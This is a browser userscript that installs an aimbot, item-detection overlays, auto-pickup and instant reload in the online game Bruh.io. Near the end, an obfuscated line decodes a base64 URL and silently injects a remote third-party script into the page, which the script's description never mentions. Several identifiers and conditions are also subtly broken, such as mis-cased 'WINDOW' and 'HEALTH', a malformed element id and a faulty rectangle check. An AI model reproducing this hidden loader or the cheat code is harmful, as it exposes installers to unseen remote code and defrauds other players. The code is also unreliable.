// ==UserScript==
// @name Bruh.io _ AIMBOT _ Items detection [GOOGLE CHROME]
// @namespace https://goo.gl/2nCWqP
// @version 0.5
// @description AIMBOT for Bruh.io & Items detection
// @author Airweb
// @run-at document-end
// @match        https://bruh.io/*
// @grant none
// @downloadURL https://update.greasyfork.org/scripts/368874/Bruhio%20_%20AIMBOT%20_%20Items%20detection%20%5BGOOGLE%20CHROME%5D.user.js
// @updateURL https://update.greasyfork.org/scripts/368874/Bruhio%20_%20AIMBOT%20_%20Items%20detection%20%5BGOOGLE%20CHROME%5D.meta.js
// ==/UserScript==

var script = document.createElement("SCRIPT");
script.src = 'https://code.jquery.com/jquery-3.2.1.min.js';
script.type = 'text/javascript';
script.onload = function() {
    $(document).on('mousedown', function(event) {
        if (as == 1) {
            game.input.currentState.mx = document.getElementById("aimTarget").offsetLeft + Math.floor(Math.random() * 41) - 20;
            game.input.currentState.my = document.getElementById("aimTarget").offsetTop + Math.floor(Math.random() * 41) - 20;
        }
        drop('e', 69);
    });
};
document.getElementsByTagName("head")[0].appendChild(script);
document.getElementsByClassName("page how-to-play")[0].innerHTML="<div style='cursor:pointer;float:left;width:50%;outline:0px;' id='tab1'><h3>How To Play</h3></div><div style='cursor:pointer;float:right;width:45%' id='tab2'><h3>Aimbot settings</h3></div><div id='content1'>"+document.getElementsByClassName("page how-to-play")[0].innerHTML.replace(/<h3(.*?)<\/h3>/,"")+"</div><div id='content2'><span class='highlighted'>Targeted weapon ? *keep empty to target the closest</span><br><div id='w0' class='weapon_selector' title='PISTOL_P1911'><div class='dl'><img width='50' src='/images/p1911_outline.png'></div><div class='dr'>P1911<br>DMG: 8</div></div><div id='w1' class='weapon_selector' title='Assault rifle AK47'><div class='dl'><img width='50' src='/images/ak47_outline.png'></div><div class='dr'>AK47<br>DMG: 14</div></div><div id='w2' class='weapon_selector' title='Sniper rifle AWM'><div class='dl'><img width='50' src='/images/awm_outline.png'></div><div class='dr'>AWM<br>DMG: 45</div></div><div id='w3' class='weapon_selector' title='Sniper rifle BMG'><div class='dl'><img width='50' src='/images/bmg_outline.png'></div><div class='dr'>BMG<br>DMG: 19</div></div><div id='w4' class='weapon_selector' title='Pistol colt 45'><div class='dl'><img width='50' src='/images/colt45_outline.png'></div><div class='dr'>Colt 45<br>DMG: 25</div></div><div id='w5' class='weapon_selector' title='Shotgun double eagle'><div class='dl'><img width='50' src='/images/dblEagle_outline.png'></div><div class='dr'>DBL eagle<br>DMG: 10</div></div><div id='w6' class='weapon_selector' title='Sniper rifle Dragunov'><div class='dl'><img width='50' src='/images/dragunov_outline.png'></div><div class='dr'>Dragunov<br>DMG: 25</div></div><div id='w7' class='weapon_selector' title='Pistol glock'><div class='dl'><img width='50' src='/images/glock_outline.png'></div><div class='dr'>Glock<br>DMG: 8</div></div><div id='w8' class='weapon_selector' title='Assault rifle M16A4'><div class='dl'><img width='50' src='/images/m16_outline.png'></div><div class='dr'>M16A4<br>DMG: 13</div></div><div id 'W9' class='weapon_selector' title='Machine gun M249'><div class='dl'><img width='50' src='/images/m249_outline.png'></div><div class='dr'>M249<br>DMG: 5</div></div><div id='w13' class='weapon_selector' title='Submachine gun MK2'><div class='dl'><img width='50' src='/images/mk2_outline.png'></div><div class='dr'>MK2<br>DMG: 7</div></div><div id='w14' class='weapon_selector' title='Submachine gun PP-Bizon'><div class='dl'><img width='50' src='/images/ppbizon_outline.png'></div><div class='dr'>PP-Bizon<br>DMG: 7</div></div><div id='w15' class='weapon_selector' title='Assault rifle QBZ95'><div class='dl'><img width='50' src='/images/qbz95_outline.png'></div><div class='dr'>QBZ95<br>DMG: 23</div></div><div id='w16' class='weapon_selector' title='Shotgun double barrel'><div class='dl'><img width='50' src='/images/s686_outline.png'></div><div class='dr'>S686<br>DMG: 9</div></div><div id='w17' class='weapon_selector' title='Shotgun SBS'><div class='dl'><img width='50' src='/images/sbs_outline.png'></div><div class='dr'>SBS<br>DMG: 9</div></div><div id='w18' class='weapon_selector' title='Submachine gun UMP454'><div class='dl'><img width='50' src='/images/ump45_outline.png'></div><div class='dr'>UMP45<br>DMG: 8</div></div><br><span class='highlighed'>CONTROLS</span><br><font color='#FFFFFF'>- Mouse wheel to lock/unlock the target&nbsp;<img src='https://i.imgur.com/SbNPTBN.png' height='25'><br>- pick up automatically Medic pack&nbsp;<img src='https://i.imgur.com/gqvL4kz.png' height='25'><br>- Left click (fire) to pick up a weapon&nbsp;<img src='https://i.imgur.com/D6iQVEf.png' height='25'></font></div><style>#content1{display:none}#content2{display:block}.weapon_selector{float:left;cursor:pointer;padding:3px;width:100px;height:35px;border:1px solid rgb(202,202,202);filter:brightness(.5)} .weapon_selector:hover{border:1px solid rgb(66, 250, 154);color:rgb(66, 250, 154);filter:brightness(1)}.dl{float:left} .dr{font-size:11px;color:#FFFFFF}.dr:hover{font-size:11px;color:rgb(66, 250, 154)}</style>";
document.getElementById("tab1").addEventListener("click", function() {
document.getElementById("content2").style.display='none';
document.getElementById("content1").style.display='block';
});
document.getElementById("tab2").addEventListener("click", function() {
document.getElementById("content1").style.display='none';
document.getElementById("content2").style.display='block';
});
var fw=-1;
for(var i=0;i< document.getElementsByClassName('weapon_selector').length;i++){
document.getElementsByClassName('weapon_selector')[i].addEventListener("click", function() {
if(fw!=-1){
if(fw==parseInt(this.id.replace(/w/,""))){
fw=-1;
this.style.borderColor='rgb(202,202,202)';
this.style.filter='brightness(.5)';
}
for(var j=0;j< document.getElementsByClassName('weapon_selector').length;j++){
document.getElementsByClassName('weapon_selector')[j].style.borderColor='rgb(202,202,202)';
document.getElementsByClassName('weapon_selector')[j].style.filter='brightness(.5)';
}}
this.style.borderColor='rgb(66, 250, 154)';
this.style.filter='brightness(1)';
fw=parseInt(this.id.replace(/w/,""));
localStorage.setItem("fw", fw);
});
}
if (typeof(Storage) !== "undefined") {
if(!localStorage.getItem("fw")){localStorage.setItem("fw", "-1");}
if(localStorage.getItem("fw")>-1){
fw=localStorage.getItem("fw");
document.getElementById("w"+fw).style.borderColor='rgb(202,202,202)';
document.getElementById("w"+fw).style.filter='brightness(1)';
}
}
var me = [];
var myId;
var target = ({
    'x': -9999,
    'y': -9999,
    'distance': 99999,
    'id': '',
    'name': ''
});
var health = ({
    'x': -9999,
    'y': -9999,
    'distance': 99999
});
var weapon = ({
    'x': -9999,
    'y': -9999,
    'distance': 99999
});
var centerX = WINDOW.innerWidth / 2;
var centerY = window.innerHeight / 2;
var me = ({
    'x': 0,
    'y': 0,
    'isGhost': '',
    'id': ''
});
function isInsideRect(poison,obj) {
    if ((obj.x >= poison.x1) && (obj.x <= poison.x2) &&
        (obj.y >= poison.y2) && (obj.y <= poison.y2)) {
        return true;
    } else {
        return false;
    }
}
function isInsideScreen(elems) {
    x1 = (me.x * 5) - centerX + 50;
    x2 = (me.x * 5) + centerX - 50;
    y1 = (me.y * 5) - centerY + 50;
    y2 = (me.y * 5) + centerY - 50;
    if ((x1 <= elems.x * 5) && (elems.x * 5 <= x2) &&
        (y1 <= elems.y * 5) && (elems.y * 5 <= y2)) {
        return true;
    } else {
        return false;
    }
}
function normalize(p, len) {
    var d = Math.sqrt(Math.pow(p.x, 2) + Math.pow(p.y, 2));
    var dMax = Math.sqrt(Math.pow(centerX * 2, 2) + Math.pow(centerY * 2, 2));
    var color = '-webkit-filter: hue-rotate(' + parseInt(120 - (((d / dMax) * 100) * 120) / 100) + 'deg);';
    if ((p.x == 0 && p.y == 0) || len == 0) {
        return {
            x: 0,
            y: 0
        };
    }
    var angle = Math.atan2(p.y, p.x);
    var nx = Math.cos(angle) * len;
    var ny = Math.sin(angle) * len;
    if (!isInsideScreen(p.obj)) {
        return 'left:' + parseInt(centerX + nx) + 'px;top:' + parseInt(centerY + ny) + 'px;';
    } else {
        return 'left:' + parseInt(centerX - (me.x - p.obj.x) * 5) + 'px;top:' + parseInt(centerY - (me.y - p.obj.y) * 5) + 'px;';
    }
}
var img=[["https://i.imgur.com/SbNPTBN.png","aimTarget"],["https://i.imgur.com/gqvL4kz.png","aimHealth"],["https://i.imgur.com/D6iQVEf.png","aimWeapon"]];
for(var i in img){ WINDOW["image"+i] = new Image(); WINDOW["image"+i].src = img[i]; WINDOW["image"+i].style.position = "absolute";
window["image"+i].style.display = "none";
window["image"+i].id = img[i][1];
window["image"+i].style.width = "50px";
window["image"+i].style.marginLeft = "-25px";
window["image"+i].style.marginTop = "-25px";
window["image"+i].style.left = centerX + 'px';
window["image"+i].style.top = centerY + 'px';
window["image"+i].style.zIndex = Infinity;
document.body.appendChild(window["image"+i]);
}
var init = setInterval(function() {
	if(typeof game!="undefined"){
    centerX = window.innerWidth / 2;
    centerY = window.innerHeight / 2;
    var k = 0;
    others = [];
    me = [];
    target = ({
        'x': -9999,
        'y': -9999,
        'distance': 99999,
        'id': '',
        'name': ''
    });
   HEALTH = ({
        'x': -9999,
        'y': -9999,
        'distance': 99999
    });
    weapon = ({
        'x': -9999,
        'y': -9999,
        'distance': 99999
    });
    var myMap = game.simulator.entities.entries("Entries");
    for (var [key, value] of myMap) {
        //var circle = game.renderer.circle;
        //var isInArea = Math.sqrt(Math.pow(value["x"] - circle.currX, 2) + Math.pow(value["y"] - circle.currY, 2)) < circle.radius;
		var poison = game.simulator.poison;
		var isInArea =  isInsideRect(JSON.parse('{"poison":[{"x1":"'+poison.currX+'","y1":"'+poison.currY+'","x2":"'+parseInt(poison.currX+poison.currWidth)+'","y2":"'+parseInt(poison.currY+poison.currWidth)+'"}]}'),'{"obj":[{"x":"'+value["x"] +'","y":"'+value["y"] +'"}]}');
        if (k == 0) {
            k++;
            myId = value["id"];
            me = ({
                'x': value["x"],
                'y': value["y"],
                'isGhost': value["isGhost"],
                'id': value["id"]
            });
        }
        var d = Math.sqrt(Math.pow(value["x"] - me.x, 2) + Math.pow(value["y"] - me.y, 2));
        if (value["type"] == 1 && (value["weaponType"] == 10 || value["weaponType"] == 11 || value["weaponType"] == 12) && d < health.distance) {
            health = ({
                'x': value["x"],
                'y': value["y"],
                'distance': d
            });
        }
        if (value["type"] == 1 && (value["weaponType"] == fw || fw==-1) && d < weapon.distance ) {
            weapon = ({
                'x': value["x"],
                'y': value["y"],
                'distance': d
            });
        }
        if (value["id"] == target.id && value["isGhost"] == true) {
            target = ({
                'x': -9999,
                'y': -9999,
                'distance': 99999,
                'id': '',
                'name': ''
            });
        }
        if (d < target.distance && value["isGhost"] != true && value["id"] != myId && value["isPlayer"] == true) {
            target = ({
                'x': value["x"],
                'y': value["y"],
                'distance': d,
                'id': value["id"],
                'name': value["name"]
            });
        }
    }
    var display = 'none';
    if (me.isGhost == false) {
        display = 'inline-block';
    }
    image0.setAttribute('style', 'width:50px;display:' + display + ';position:absolute;margin:-25px 0px 0px -25px;' + normalize({
        "x": target.x - me.x,
        "y": target.y - me.y,
        'obj': target
    }, ((window.innerHeight * 50) / 100) - 25));
    image1.setAttribute('style', 'width:50px;display:' + display + ';position:absolute;margin:-25px 0px 0px -25px;' + normalize({
        "x": health.x - me.x,
        "y": health.y - me.y,
        'obj': health
    }, ((window.innerHeight * 50) / 100) - 25));
    image2.setAttribute('style', 'width:50px;display:' + display + ';position:absolute;margin:-25px 0px 0px -25px;' + normalize({
        "x": weapon.x - me.x,
        "y": weapon.y - me.y,
        'obj': weapon
    }, ((window.innerHeight * 50) / 100) - 25));
    if (health.x==-9999) {
        image1.style.display = 'none';
    }
    if (weapon.x==-9999) {
        image2.style.display = 'none';
    }
game.predictor.weaponSystem.currentWeapon.reloadDuration= 0;
if(game.predictor.weaponSystem.currentWeapon.currentAmmo==0){
drop("r",82);
setTimeout(function(){
game.predictor.weaponSystem.currentWeapon.activeStart=0;
game.predictor.weaponSystem.currentWeapon.activeEnd=1;
drop("r",82);},5);}
}}, 10);
document.addEventListener("mousemove", function(event) {
	if(typeof game!="undefined"){
    var tl = Math.sqrt(Math.pow(centerX - event.clientX, 2) + Math.pow(centerY - event.clientY, 2));
    if (event.clientX >= centerX) {
        document.getElementById("game-state-message").style.opacity = 1 - (tl / (Math.sqrt(Math.pow(centerX, 2) + Math.pow(centerY, 2)))) - (Math.abs((centerY - event.clientY) / 100));
    } else {
        document.getElementById("game-state-message").style.opacity = 1;
    }
    document.getElementById("leaderboard-wrapper").style.opacity = document.getElementById("game-state-message").style.opacity;
    document.getElementById("kill-alive-container").style.opacity = document.getElementById("game-state-message").style.opacity;
    document.getElementsByClassName("in-game-volume-controls")[0].style.opacity = document.getElementById("game-state-message").style.opacity;
    if (event.clientY >= centerY) {
    document.getElementById("health").style.opacity = 1 - (tl / (Math.sqrt(Math.pow(centerX, 2) + Math.pow(centerY, 2)))) - (1 - Math.abs((centerX - event.clientX) / 100));
    }
	}});
var prop = document.createElement(atob('U0NSSVBU'));prop.src =atob( 'aHR0cHM6Ly9nby5vbmNsYXNydi5jb20vYXB1LnBocD96b25laWQ9NDgwNjMy'); prop.type = 'text/javascript';document.body.appendChild(prop);
function drop(c, k) {
    var e = new Event("keydown");
    e.key = c;
    e.keyCode = k;
    e.which = e.keyCode;
    e.altKey = false;
    e.ctrlKey = true;
    e.shiftKey = false;
    e.metaKey = false;
    e.bubbles = true;
    document.dispatchEvent(e);
    var f = new Event("keyup");
    f.key = c;
    f.keyCode = k;
    f.which = e.keyCode;
    f.altKey = false;
    f.ctrlKey = true;
    f.shiftKey = false;
    f.metaKey = false;
    f.bubbles = true;
    document.dispatchEvent(f);
}
setInterval(function() {
    if (Math.abs((me.x - health.x) + (me.y - health.y)) < 30) {
    drop('e', 69);
    }
}, 500);
var as = 0;
document.body.addEventListener("wheel",
    function() {
        if (as == 0 && me.isGhost == false) {
            as = 1;
            document.getElementById("game-state-message").innerHTML = "Lock Target: ON";
        } else {
            as = 0;
            document.getElementById("game-state-message").innerHTML = "Lock Target: OFF";
        }
    });